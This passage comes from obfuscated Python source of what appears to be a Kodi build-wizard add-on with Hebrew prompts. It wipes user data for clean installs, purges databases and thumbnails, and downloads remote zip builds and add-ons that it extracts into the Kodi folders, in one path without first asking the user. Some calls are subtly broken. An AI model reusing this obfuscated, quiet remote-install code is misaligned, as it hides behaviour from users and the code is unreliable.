				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.video.elementum'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4668
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4669
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4670
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.video.quasar'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4672
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'program.apollo'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4673
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4674
				elif O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -2 ]=='userdata'and O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0OOOO0O000OO00O0 [O000O00OO0OOO0OO0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4675
				elif O0OO000O00O0000OO in LOGFILES :wiz .log ("Keep Log File: %s"%O0OO000O00O0000OO ,xbmc .LOGNOTICE )#line:4676
				elif O0OO000O00O0000OO .endswith ('.db'):#line:4677
					try :#line:4678
						if O0OO000O00O0000OO ==OOOOOOO0OOOOO0OO0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0OO000O00O0000OO ,KODIV ),xbmc .LOGNOTICE )#line:4679
						else :os .remove (os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ))#line:4680
					except Exception as O00O00000OO0000OO :#line:4681
						if not O0OO000O00O0000OO .startswith ('Textures13'):#line:4682
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4683
							wiz .log ("-> %s"%(str (O00O00000OO0000OO )),xbmc .LOGNOTICE )#line:4684
							wiz .purgeDb (os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ))#line:4685
				else :#line:4686
					DP .update (int (wiz .percentage (O0OO00OOOOOOOO0O0 ,OOOO00000000OO0O0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO000O00O0000OO ),'')#line:4687
					try :os .remove (os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ))#line:4688
					except Exception as O00O00000OO0000OO :#line:4689
						wiz .log ("Error removing %s"%os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),xbmc .LOGNOTICE )#line:4690
						wiz .log ("-> / %s"%(str (O00O00000OO0000OO )),xbmc .LOGNOTICE )#line:4691
			if DP .iscanceled ():#line:4692
				DP .close ()#line:4693
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4694
				return False #line:4695
		for OO000O0OO0OOOO000 ,O0OO0OOOOOOOO0000 ,OOOOOO00OO00OO000 in os .walk (OO0OOOO000OOOO00O ,topdown =True ):#line:4696
			O0OO0OOOOOOOO0000 [:]=[O00O00O000OOOOOOO for O00O00O000OOOOOOO in O0OO0OOOOOOOO0000 if O00O00O000OOOOOOO not in EXCLUDES ]#line:4697
			for O0OO000O00O0000OO in O0OO0OOOOOOOO0000 :#line:4698
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO000O00O0000OO ),'')#line:4699
			  if O0OO000O00O0000OO not in ["Database","userdata","temp","addons","addon_data"]:#line:4700
			   if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4701
			    if not (O0OO000O00O0000OO =='skin.titan'and KEEPSKIN3 =='true'):#line:4703
			      if not (O0OO000O00O0000OO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4704
			       if not (O0OO000O00O0000OO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4705
			        if not (O0OO000O00O0000OO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4706
			         if not (O0OO000O00O0000OO =='program.apollo'and KEEPINFO =='true'):#line:4707
			          if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4708
			            if not (O0OO000O00O0000OO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4710
			             if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4711
			              if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4712
			               if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4713
			                if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4714
			                 if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4715
			                  if not (O0OO000O00O0000OO =='plugin.video.neptune'and KEEPINFO =='true'):#line:4716
			                   if not (O0OO000O00O0000OO =='plugin.video.youtube'and KEEPINFO =='true'):#line:4717
			                    if not (O0OO000O00O0000OO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4718
			                     if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4719
			                       if not (O0OO000O00O0000OO =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4721
			                           if not (O0OO000O00O0000OO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4725
			                            if not (O0OO000O00O0000OO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4726
			                             if not (O0OO000O00O0000OO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4727
			                              if not (O0OO000O00O0000OO =='plugin.video.quasar'and KEEPINFO =='true'):#line:4728
			                               if not (O0OO000O00O0000OO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4729
			                                  shutil .rmtree (os .path .join (OO000O0OO0OOOO000 ,O0OO000O00O0000OO ),ignore_errors =True ,onerror =None )#line:4731
			if DP .iscanceled ():#line:4732
				DP .close ()#line:4733
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4734
				return False #line:4735
		DP .close ()#line:4736
		wiz .clearS ('build')#line:4737
		if over ==True :#line:4738
			return True #line:4739
		elif install =='restore':#line:4740
			return True #line:4741
		elif install :#line:4742
			buildWizard (install ,'normal',over =True )#line:4743
		else :#line:4744
			if INSTALLMETHOD ==1 :OO0OO00OO0O0OO000 =1 #line:4745
			elif INSTALLMETHOD ==2 :OO0OO00OO0O0OO000 =0 #line:4746
			else :OO0OO00OO0O0OO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4747
			if OO0OO00OO0O0OO000 ==1 :wiz .reloadFix ('fresh')#line:4748
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4749
	else :#line:4750
		if not install =='restore':#line:4751
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4752
			wiz .refresh ()#line:4753
def clearCache ():#line:4758
		wiz .clearCache ()#line:4759
def fixwizard ():#line:4763
		wiz .fixwizard ()#line:4764
def totalClean ():#line:4766
		wiz .clearCache ()#line:4768
		wiz .clearPackages ('total')#line:4769
		clearThumb ('total')#line:4770
		cleanfornewbuild ()#line:4771
def cleanfornewbuild ():#line:4772
		try :#line:4773
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4774
		except :#line:4775
			pass #line:4776
		try :#line:4777
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4778
		except :#line:4779
			pass #line:4780
		try :#line:4781
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4782
		except :#line:4783
			pass #line:4784
def clearThumb (type =None ):#line:4785
	OO00O00000O0O0O00 =wiz .latestDB ('Textures')#line:4786
	if not type ==None :O0O0O0000OO0OOOOO =1 #line:4787
	else :O0O0O0000OO0OOOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00O00000O0O0O00 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4788
	if O0O0O0000OO0OOOOO ==1 :#line:4789
		try :wiz .removeFile (os .join (DATABASE ,OO00O00000O0O0O00 ))#line:4790
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00O00000O0O0O00 )#line:4791
		wiz .removeFolder (THUMBS )#line:4792
	else :wiz .log ('Clear thumbnames cancelled')#line:4794
	wiz .redoThumbs ()#line:4795
def purgeDb ():#line:4797
	OOO0OO0OOO0OO0O0O =[];OO0OO0O0OO0O0O0O0 =[]#line:4798
	for OO0OOOO0OO00OO0O0 ,O0000OO00OO0O0OO0 ,OO00000O00OO00O0O in os .walk (HOME ):#line:4799
		for O00O0OO00O00OO00O in fnmatch .filter (OO00000O00OO00O0O ,'*.db'):#line:4800
			if O00O0OO00O00OO00O !='Thumbs.db':#line:4801
				O000O00O0O000OOOO =os .path .join (OO0OOOO0OO00OO0O0 ,O00O0OO00O00OO00O )#line:4802
				OOO0OO0OOO0OO0O0O .append (O000O00O0O000OOOO )#line:4803
				O00O00O0O00OOO0O0 =O000O00O0O000OOOO .replace ('\\','/').split ('/')#line:4804
				OO0OO0O0OO0O0O0O0 .append ('(%s) %s'%(O00O00O0O00OOO0O0 [len (O00O00O0O00OOO0O0 )-2 ],O00O00O0O00OOO0O0 [len (O00O00O0O00OOO0O0 )-1 ]))#line:4805
	if KODIV >=16 :#line:4806
		O0O00OO0OOO0O0OOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0OO0O0OO0O0O0O0 )#line:4807
		if O0O00OO0OOO0O0OOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4808
		elif len (O0O00OO0OOO0O0OOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4809
		else :#line:4810
			for OOOO0OOO0O0O0O0OO in O0O00OO0OOO0O0OOO :wiz .purgeDb (OOO0OO0OOO0OO0O0O [OOOO0OOO0O0O0O0OO ])#line:4811
	else :#line:4812
		O0O00OO0OOO0O0OOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0OO0O0OO0O0O0O0 )#line:4813
		if O0O00OO0OOO0O0OOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4814
		else :wiz .purgeDb (OOO0OO0OOO0OO0O0O [OOOO0OOO0O0O0O0OO ])#line:4815
def fastupdatefirstbuild (OOO00OOO0OOOOOO0O ):#line:4821
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4822
	if ENABLE =='Yes':#line:4823
		if not NOTIFY =='true':#line:4824
			OO00OO00000O0OO0O =wiz .workingURL (NOTIFICATION )#line:4825
			if OO00OO00000O0OO0O ==True :#line:4826
				OOOO0OO000OO0OO00 ,O00000O000000O000 =wiz .splitNotify (NOTIFICATION )#line:4827
				if not OOOO0OO000OO0OO00 ==False :#line:4829
					try :#line:4830
						OOOO0OO000OO0OO00 =int (OOOO0OO000OO0OO00 );OOO00OOO0OOOOOO0O =int (OOO00OOO0OOOOOO0O )#line:4831
						checkidupdate ()#line:4832
						wiz .setS ("notedismiss","true")#line:4833
						if OOOO0OO000OO0OO00 ==OOO00OOO0OOOOOO0O :#line:4834
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOO0OO000OO0OO00 ),xbmc .LOGNOTICE )#line:4835
						elif OOOO0OO000OO0OO00 >OOO00OOO0OOOOOO0O :#line:4837
							wiz .log ("[Notifications] id: %s"%str (OOOO0OO000OO0OO00 ),xbmc .LOGNOTICE )#line:4838
							wiz .setS ('noteid',str (OOOO0OO000OO0OO00 ))#line:4839
							wiz .setS ("notedismiss","true")#line:4840
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4843
					except Exception as OO00O0OOOO000OOO0 :#line:4844
						wiz .log ("Error on Notifications Window: %s"%str (OO00O0OOOO000OOO0 ),xbmc .LOGERROR )#line:4845
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4847
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO00OO00000O0OO0O ),xbmc .LOGNOTICE )#line:4848
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4849
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4850
def checkidupdate ():#line:4856
				wiz .setS ("notedismiss","true")#line:4858
				OOOO0000OOO000OO0 =wiz .workingURL (NOTIFICATION )#line:4859
				OO00O000OO0O000O0 =" Kodi Premium"#line:4861
				OOOOOO0OOO0OOOO00 =wiz .checkBuild (OO00O000OO0O000O0 ,'gui')#line:4862
				O0OO0OO000OO0OO00 =OO00O000OO0O000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4863
				if not wiz .workingURL (OOOOOO0OOO0OOOO00 )==True :return #line:4864
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4865
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00O000OO0O000O0 ),'','אנא המתן')#line:4866
				OO0O0OOO000OOOOOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0OO000OO0OO00 )#line:4867
				try :os .remove (OO0O0OOO000OOOOOO )#line:4868
				except :pass #line:4869
				logging .warning (OOOOOO0OOO0OOOO00 )#line:4870
				if 'google'in OOOOOO0OOO0OOOO00 :#line:4871
				   OO0OO0OO00O00O000 =googledrive_download (OOOOOO0OOO0OOOO00 ,OO0O0OOO000OOOOOO ,DP ,wiz .checkBuild (OO00O000OO0O000O0 ,'filesize'))#line:4872
				else :#line:4875
				  downloader .download (OOOOOO0OOO0OOOO00 ,OO0O0OOO000OOOOOO ,DP )#line:4876
				xbmc .sleep (100 )#line:4877
				OOO00OO0OOOO00000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O000OO0O000O0 )#line:4878
				DP .update (0 ,OOO00OO0OOOO00000 ,'','אנא המתן')#line:4879
				extract .all (OO0O0OOO000OOOOOO ,HOME ,DP ,title =OOO00OO0OOOO00000 )#line:4880
				DP .close ()#line:4881
				wiz .defaultSkin ()#line:4882
				wiz .lookandFeelData ('save')#line:4883
				if KODIV >=18 :#line:4884
					skindialogsettind18 ()#line:4885
				if INSTALLMETHOD ==1 :OOOO0O0O0O00O0000 =1 #line:4888
				elif INSTALLMETHOD ==2 :OOOO0O0O0O00O0000 =0 #line:4889
				else :DP .close ()#line:4890
def gaiaserenaddon ():#line:4892
  O00OOO0000O00000O =(ADDON .getSetting ("gaiaseren"))#line:4893
  OOOOOO0OO0OOO0O00 =(ADDON .getSetting ("rdbuild"))#line:4894
  if O00OOO0000O00000O =='true'and OOOOOO0OO0OOO0O00 =='true':#line:4895
    O0O0OO00OOOO0OOOO =(NEWFASTUPDATE )#line:4896
    O000O0O0O0OO00O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4897
    OO0O00000000O0000 =xbmcgui .DialogProgress ()#line:4898
    OO0O00000000O0000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4899
    OOO000O000O0O000O =os .path .join (PACKAGES ,'isr.zip')#line:4900
    OO0O00OOO000O0000 =urllib2 .Request (O0O0OO00OOOO0OOOO )#line:4901
    OOO0O00000000O0OO =urllib2 .urlopen (OO0O00OOO000O0000 )#line:4902
    OO0OOO00OOOOO0OOO =xbmcgui .DialogProgress ()#line:4904
    OO0OOO00OOOOO0OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4905
    OO0OOO00OOOOO0OOO .update (0 )#line:4906
    O0OO00O0OO00OO000 =open (OOO000O000O0O000O ,'wb')#line:4908
    try :#line:4910
      OOOO0O00OOOOOO0OO =OOO0O00000000O0OO .info ().getheader ('Content-Length').strip ()#line:4911
      O0O0OOOO000OO0000 =True #line:4912
    except AttributeError :#line:4913
          O0O0OOOO000OO0000 =False #line:4914
    if O0O0OOOO000OO0000 :#line:4916
          OOOO0O00OOOOOO0OO =int (OOOO0O00OOOOOO0OO )#line:4917
    OOOO0OOO0OO0O0000 =0 #line:4919
    OO0O0O000O0O0000O =time .time ()#line:4920
    while True :#line:4921
          O000000OO0OO0000O =OOO0O00000000O0OO .read (8192 )#line:4922
          if not O000000OO0OO0000O :#line:4923
              sys .stdout .write ('\n')#line:4924
              break #line:4925
          OOOO0OOO0OO0O0000 +=len (O000000OO0OO0000O )#line:4927
          O0OO00O0OO00OO000 .write (O000000OO0OO0000O )#line:4928
          if not O0O0OOOO000OO0000 :#line:4930
              OOOO0O00OOOOOO0OO =OOOO0OOO0OO0O0000 #line:4931
          if OO0OOO00OOOOO0OOO .iscanceled ():#line:4932
             OO0OOO00OOOOO0OOO .close ()#line:4933
             try :#line:4934
              os .remove (OOO000O000O0O000O )#line:4935
             except :#line:4936
              pass #line:4937
             break #line:4938
          O00O0000OOOOOOOO0 =float (OOOO0OOO0OO0O0000 )/OOOO0O00OOOOOO0OO #line:4939
          O00O0000OOOOOOOO0 =round (O00O0000OOOOOOOO0 *100 ,2 )#line:4940
          OOOOOO00000OOOOOO =OOOO0OOO0OO0O0000 /(1024 *1024 )#line:4941
          O000OOOOOOO00O0O0 =OOOO0O00OOOOOO0OO /(1024 *1024 )#line:4942
          O0OO0O0O0000O0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOO00000OOOOOO ,'teal',O000OOOOOOO00O0O0 )#line:4943
          if (time .time ()-OO0O0O000O0O0000O )>0 :#line:4944
            O00O00OO000O000O0 =OOOO0OOO0OO0O0000 /(time .time ()-OO0O0O000O0O0000O )#line:4945
            O00O00OO000O000O0 =O00O00OO000O000O0 /1024 #line:4946
          else :#line:4947
           O00O00OO000O000O0 =0 #line:4948
          OO00OOO00OOO0O0O0 ='KB'#line:4949
          if O00O00OO000O000O0 >=1024 :#line:4950
             O00O00OO000O000O0 =O00O00OO000O000O0 /1024 #line:4951
             OO00OOO00OOO0O0O0 ='MB'#line:4952
          if O00O00OO000O000O0 >0 and not O00O0000OOOOOOOO0 ==100 :#line:4953
              OOOO00O00OO0O0OO0 =(OOOO0O00OOOOOO0OO -OOOO0OOO0OO0O0000 )/O00O00OO000O000O0 #line:4954
          else :#line:4955
              OOOO00O00OO0O0OO0 =0 #line:4956
          OO0OOOOO00O000O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O00OO000O000O0 ,OO00OOO00OOO0O0O0 )#line:4957
          OO0OOO00OOOOO0OOO .update (int (O00O0000OOOOOOOO0 ),O0OO0O0O0000O0OO0 ,OO0OOOOO00O000O0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4959
    OOOOO0O0000O0O0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4962
    O0OO00O0OO00OO000 .close ()#line:4965
    extract .all (OOO000O000O0O000O ,OOOOO0O0000O0O0O0 ,OO0OOO00OOOOO0OOO )#line:4966
    try :#line:4970
      os .remove (OOO000O000O0O000O )#line:4971
    except :#line:4972
      pass #line:4973
def testnotify ():#line:4975
	OO00O000OO000O00O =wiz .workingURL (NOTIFICATION )#line:4976
	if OO00O000OO000O00O ==True :#line:4977
		try :#line:4978
			O000O00O0OOO00000 ,OO0O0000OOO00OOOO =wiz .splitNotify (NOTIFICATION )#line:4979
			if O000O00O0OOO00000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4980
			if STARTP2 ()=='ok':#line:4981
				notify .notification (OO0O0000OOO00OOOO ,True )#line:4982
		except Exception as OOO0O0OOO0OOOOO00 :#line:4983
			wiz .log ("Error on Notifications Window: %s"%str (OOO0O0OOO0OOOOO00 ),xbmc .LOGERROR )#line:4984
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4985
def testnotify2 ():#line:4986
	OOOOO0OOOOOO00O00 =wiz .workingURL (NOTIFICATION2 )#line:4987
	if OOOOO0OOOOOO00O00 ==True :#line:4988
		try :#line:4989
			O00O0OOO0OOO0O0OO ,OOO0O00O0O00OOOO0 =wiz .splitNotify (NOTIFICATION2 )#line:4990
			if O00O0OOO0OOO0O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4991
			if STARTP2 ()=='ok':#line:4992
				notify .notification2 (OOO0O00O0O00OOOO0 ,True )#line:4993
		except Exception as O0O00OOO0O00OOOO0 :#line:4994
			wiz .log ("Error on Notifications Window: %s"%str (O0O00OOO0O00OOOO0 ),xbmc .LOGERROR )#line:4995
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4996
def testnotify3 ():#line:4997
	OOOO0000OO000O0O0 =wiz .workingURL (NOTIFICATION3 )#line:4998
	if OOOO0000OO000O0O0 ==True :#line:4999
		try :#line:5000
			O00000OOO0O0O0O00 ,OOO00O0OOOO000OO0 =wiz .splitNotify (NOTIFICATION3 )#line:5001
			if O00000OOO0O0O0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5002
			if STARTP2 ()=='ok':#line:5003
				notify .notification3 (OOO00O0OOOO000OO0 ,True )#line:5004
		except Exception as O0OOO000OO0OO00O0 :#line:5005
			wiz .log ("Error on Notifications Window: %s"%str (O0OOO000OO0OO00O0 ),xbmc .LOGERROR )#line:5006
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5007
def servicemanual ():#line:5008
	O0O00O000OO0O00O0 =wiz .workingURL (HELPINFO )#line:5009
	if O0O00O000OO0O00O0 ==True :#line:5010
		try :#line:5011
			O0OO0OOO0O0000OO0 ,OO000OOO00OOOOOOO =wiz .splitNotify (HELPINFO )#line:5012
			if O0OO0OOO0O0000OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5013
			notify .helpinfo (OO000OOO00OOOOOOO ,True )#line:5014
		except Exception as OOO000OO0000O000O :#line:5015
			wiz .log ("Error on Notifications Window: %s"%str (OOO000OO0000O000O ),xbmc .LOGERROR )#line:5016
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5017
def testupdate ():#line:5019
	if BUILDNAME =="":#line:5020
		notify .updateWindow ()#line:5021
	else :#line:5022
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5023
def testfirst ():#line:5025
	notify .firstRun ()#line:5026
def testfirstRun ():#line:5028
	notify .firstRunSettings ()#line:5029
def fastinstall ():#line:5032
	notify .firstRuninstall ()#line:5033
def addDir (O0O0O00O0O00O00O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5040
	O0OO0O00O00OO0OOO =sys .argv [0 ]#line:5041
	if not mode ==None :O0OO0O00O00OO0OOO +="?mode=%s"%urllib .quote_plus (mode )#line:5042
	if not name ==None :O0OO0O00O00OO0OOO +="&name="+urllib .quote_plus (name )#line:5043
	if not url ==None :O0OO0O00O00OO0OOO +="&url="+urllib .quote_plus (url )#line:5044
	O0OOOOO0OO0OOO0O0 =True #line:5045
	if themeit :O0O0O00O0O00O00O0 =themeit %O0O0O00O0O00O00O0 #line:5046
	O0O0000O0O00O0OO0 =xbmcgui .ListItem (O0O0O00O0O00O00O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5047
	O0O0000O0O00O0OO0 .setInfo (type ="Video",infoLabels ={"Title":O0O0O00O0O00O00O0 ,"Plot":description })#line:5048
	O0O0000O0O00O0OO0 .setProperty ("Fanart_Image",fanart )#line:5049
	if not menu ==None :O0O0000O0O00O0OO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5050
	O0OOOOO0OO0OOO0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO0O00O00OO0OOO ,listitem =O0O0000O0O00O0OO0 ,isFolder =True )#line:5051
	return O0OOOOO0OO0OOO0O0 #line:5052
def addFile (O00OO00O0000O0O00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5054
	OOOO0O0O0OOO00000 =sys .argv [0 ]#line:5055
	if not mode ==None :OOOO0O0O0OOO00000 +="?mode=%s"%urllib .quote_plus (mode )#line:5056
	if not name ==None :OOOO0O0O0OOO00000 +="&name="+urllib .quote_plus (name )#line:5057
	if not url ==None :OOOO0O0O0OOO00000 +="&url="+urllib .quote_plus (url )#line:5058
	OO00OOO0O00000O00 =True #line:5059
	if themeit :O00OO00O0000O0O00 =themeit %O00OO00O0000O0O00 #line:5060
	O000O0OOOOOO0OO00 =xbmcgui .ListItem (O00OO00O0000O0O00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5061
	O000O0OOOOOO0OO00 .setInfo (type ="Video",infoLabels ={"Title":O00OO00O0000O0O00 ,"Plot":description })#line:5062
	O000O0OOOOOO0OO00 .setProperty ("Fanart_Image",fanart )#line:5063
